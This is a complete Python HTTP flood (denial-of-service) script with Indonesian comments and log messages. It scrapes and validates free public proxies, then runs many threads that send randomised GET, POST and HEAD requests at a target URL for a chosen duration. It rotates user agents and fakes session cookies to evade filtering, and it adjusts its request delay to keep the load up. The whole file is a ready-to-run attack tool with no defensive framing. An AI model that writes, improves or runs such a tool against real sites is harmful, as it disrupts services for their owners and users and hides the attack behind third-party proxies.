import requests
import threading
import time
import random
from bs4 import BeautifulSoup

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
]

HTTP_METHODS = ["GET", "POST", "HEAD"]

def fetch_proxies():
    url = "https://www.us-proxy.org/"
    proxies = []
    try:
        r = requests.get(url, timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        table = soup.find("table", id="proxylisttable")
        for row in table.tbody.find_all("tr"):
            cols = row.find_all("td")
            ip = cols[0].text
            port = cols[1].text
            https = cols[6].text.lower()
            scheme = "https" if https == "yes" else "http"
            proxies.append(f"{scheme}://{ip}:{port}")
    except Exception as e:
        print("[!] Gagal mengambil proxy:", e)
    return proxies

def validate_proxy(proxy, test_url="http://www.google.com", timeout=5):
    try:
        r = requests.get(test_url, proxies={"http": proxy, "https": proxy}, timeout=timeout)
        if r.status_code == 200:
            return True
    except:
        pass
    return False

def get_random_headers():
    cookies = f"sessionid={random.randint(100000,999999)}; userid={random.randint(1000,9999)}"
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.google.com",
        "Connection": "keep-alive",
        "Cookie": cookies
    }

def flood(target, duration, proxies, thread_id):
    end_time = time.time() + duration
    success_count = 0
    fail_count = 0
    last_log_time = 0
    delay = 0.1  # delay awal

    while time.time() < end_time:
        method = random.choice(HTTP_METHODS)
        headers = get_random_headers()

        # Coba proxy sampai 3 kali gagal baru skip
        for attempt in range(3):
            proxy = random.choice(proxies)
            proxy_dict = {"http": proxy, "https": proxy}
            try:
                if method == "GET":
                    resp = requests.get(target, proxies=proxy_dict, headers=headers, timeout=7)
                elif method == "POST":
                    data = {"test": random.randint(1, 10000)}  # Payload POST random
                    resp = requests.post(target, proxies=proxy_dict, headers=headers, data=data, timeout=7)
                else:  # HEAD
                    resp = requests.head(target, proxies=proxy_dict, headers=headers, timeout=7)

                if resp.status_code in [200, 301, 302, 403, 404]:
                    success_count += 1
                    # adaptive delay turun kalau berhasil
                    delay = max(0.05, delay - 0.01)
                    break
                else:
                    fail_count += 1
                    delay = min(1.0, delay + 0.02)
            except:
                fail_count += 1
                delay = min(1.0, delay + 0.02)
                continue  # coba proxy lain
        else:
            # Kalau 3x gagal semua
            time.sleep(0.5)  # jeda sedikit kalau semua proxy gagal

        now = time.time()
        if now - last_log_time > 5:  # Log tiap 5 detik
            print(f"[Thread {thread_id}] Sukses: {success_count} | Gagal: {fail_count} | Delay: {delay:.2f}s | Proxy: {proxy} | Method: {method}")
            last_log_time = now

        time.sleep(delay)

def main():
    import sys
    if len(sys.argv) != 4:
        print("Usage: python3 flood_full.py <target_url> <duration_seconds> <threads>")
        sys.exit(1)

    target = sys.argv[1]
    duration = int(sys.argv[2])
    thread_count = int(sys.argv[3])

    print("[*] Mengambil proxy...")
    proxies = fetch_proxies()
    print(f"[*] Proxy terambil: {len(proxies)}")

    print("[*] Validasi proxy...")
    valid_proxies = []
    for proxy in proxies:
        if validate_proxy(proxy):
            valid_proxies.append(proxy)
    print(f"[*] Proxy valid: {len(valid_proxies)}")

    if not valid_proxies:
        print("[!] Tidak ada proxy valid, keluar.")
        sys.exit(1)

    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=flood, args=(target, duration, valid_proxies, i+1))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[+] Flood selesai.")

if __name__ == "__main__":
    main()
